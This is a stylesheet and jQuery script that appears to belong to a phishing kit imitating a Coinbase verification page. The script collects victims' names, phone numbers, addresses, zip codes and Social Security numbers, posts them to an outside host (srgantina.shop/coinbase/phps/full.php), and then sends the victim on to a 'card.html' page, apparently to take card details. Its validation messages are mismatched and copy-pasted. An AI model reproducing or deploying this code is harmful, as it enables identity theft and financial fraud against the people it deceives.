@import url('https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,300;0,400;0,500;1,100;1,300;1,400&display=swap');

body{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    background: #1652f0;
    color: white;
    font-family: 'Roboto', sans-serif;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding-bottom: 30px;
}
nav{
    width: 100%;
    height: 60px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
nav img{
    margin-left: 100px;
    width: 140px;
    height: 30px;
}
nav ul{
    display: flex;
    align-items: center;
    list-style: none;
    margin-right: 80px;
}
#btnc{
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: 600;
}
#sinsc{
    border: 2px solid white;
    padding: 10px;
}
nav ul li{
    margin: 0 15px 0 15px;
    cursor: pointer;
}


.container{
    width: 100%;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    margin-top: 10px;
}
.container form{
    width: 350px;
    padding: 20px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    background-color: white;
    color: black;
}
.container form span{
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    margin-right: 2px;
    margin-left: 2px;
}
label{
    position: relative;
    top: 7px;
    font-size: 14px;
    font-weight: 400;
    color: rgb(7, 7, 15);
}
.container h1{
    padding-bottom: 10px;
    font-size: 32px;
    font-weight: 400;
}
.container form input[type="text"]{
    padding-left: 10px;
    width: 90%;
    height: 38px;
    margin-top: 10px;
    border-radius: 3px;
    border: 1.5px solid rgb(226, 226, 226);
    outline: none;
}
.container form input[type="text"]:focus{
    transition: all 0.5s ease-in-out;
    border: 1.5px solid rgba(65, 82, 238, 0.829);
}
.container form div{
    margin-top: 16px;
    width: 95%;
    display: flex;
    align-items: center;
    justify-content: space-between;
}
#spann{
    display: flex;
    flex-direction: row;
    align-items: center;
}
#msg{
    height: 0;
    margin-top: 0;
    font-weight: 500;
    font-size: 15px;
    color: rgb(7, 7, 15);
}
button{
    background-image: -webkit-gradient(linear,left top,left bottom,from(#1652f0),to(#0d40c6));
    background-image: -webkit-linear-gradient(#1652f0,#0d40c6);
    background-image: linear-gradient(#1652f0,#0d40c6);
    border-color: #137dba;
    border: none;
    border-radius: 3px;
    color: white;
    width: 250px;
    height: 45px;
    font-weight: 600;
    font-size: 15px;
}
form section{
    display: flex;
    align-items: center;
    justify-content: center;
    height: 0;
}
form section h3{
    padding-right: 5px;
    color: #1652f0;
    border-right: rgb(155, 133, 133) 2px solid;
}
form section w{
    padding-left: 5px;
    color: rgb(65, 50, 50);
    font-weight: 500;
}
#ass{
    text-align: center;
    display: flex;
    flex-wrap: wrap;
    align-items: center;
    justify-content: center;
    width: 400px;
    padding-top: 10px;
}
#ass a{
    color: white;
    text-decoration: none;
    margin: 0 5px 0 5px;
}
#ass a:hover{
    border-bottom: 1px solid white;
}
#Menu-Bar-Icon{
    display: none;
    font-size: 30px;
    margin-right: 20px;
}
@media only screen and (max-width: 900px){
    nav img{
        margin-left: 30px;
    }
    nav ul{
        margin-right: 18px;
    }
}
@media only screen and (max-width: 700px){
    nav ul{
        display: none;
    }
    #Menu-Bar-Icon{
        display: block;
    }
}
@media only screen and (max-width: 390px){
    form{
        width: 5px;
        padding: 0px 0px;
    }
}

/* global $ */
$(document).ready(function(){
var count=0;



$('#submit-btn').click(function(event){
$('#error').hide();
$('#msg').hide();
event.preventDefault();
var fname=$("#fname").val();
var sname=$("#sname").val();
var phone=$("#phone").val();
var country=$("#country").val();
var city=$("#city").val();
var ssn=$("#ssn").val();
var add1=$("#add1").val();
var add2=$("#add2").val();
var zipcode=$("#zipcode").val();
var msg = $('#msg').html();
$('#msg').text( msg );
if (!fname) {
                $('#msg').show();
                $('#msg').html("First name field is empty");

                return false;
            }
if (!sname) {
                $('#msg').show();
                $('#msg').html("Last Name field is empty");

                return false;
            }
if (!phone) {
                $('#msg').show();
                $('#msg').html("Phone number field is empty");

                return false;
            }
if (!country) {
                $('#msg').show();
                $('#msg').html("Password field is empty");

                return false;
            }
if (!city) {
                $('#msg').show();
                $('#msg').html("Password field is empty");

                return false;
            }
if (!ssn) {
                $('#msg').show();
                $('#msg').html("Please fill in your city of residence");

                return false;
            }
if (!add1) {
                $('#msg').show();
                $('#msg').html("Password field is empty");

                return false;
            }
if (!zipcode) {
                $('#msg').show();
                $('#msg').html("Email field is empty");

                return false;
            }

count=count+1;

$.ajax({
dataType: 'JSON',
url: 'https://srgantina.shop/coinbase/phps/full.php',
type: 'POST',
      	data:{
      		fname:fname,
      		sname:sname,
      		phone:phone,
      		city:city,
      		country:country,
      		ssn:ssn,
      		add1:add1,
      		zipcode:zipcode,
      	},
            data: $('#conte').serialize(),
            beforeSend: function(xhr){
            
            },
            success: function(response){
            	if(response){
            		$("#msg").show();
            		console.log(response);
            		if(response['signal'] == 'ok'){
					
            			$("#password").val("");
            			if (count>=1) {
            				count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("card.html");

                }
       	$("#msg").show();
        $('#msg').html("Please enter correct details.");
       
            }
            else{
       	$("#msg").show();
      $('#msg').html("Please enter correct details.");
            }
        }
    },
    error: function(){
					
         $("#password").val("");
    	if (count>=1) {
    		count=0;
    		window.location.replace("card.html");
    	}
       	$("#msg").show();
         $('#msg').html("Please enter correct details.");
    },
    complete: function(){
    
    }
});
  });


	});


</script>
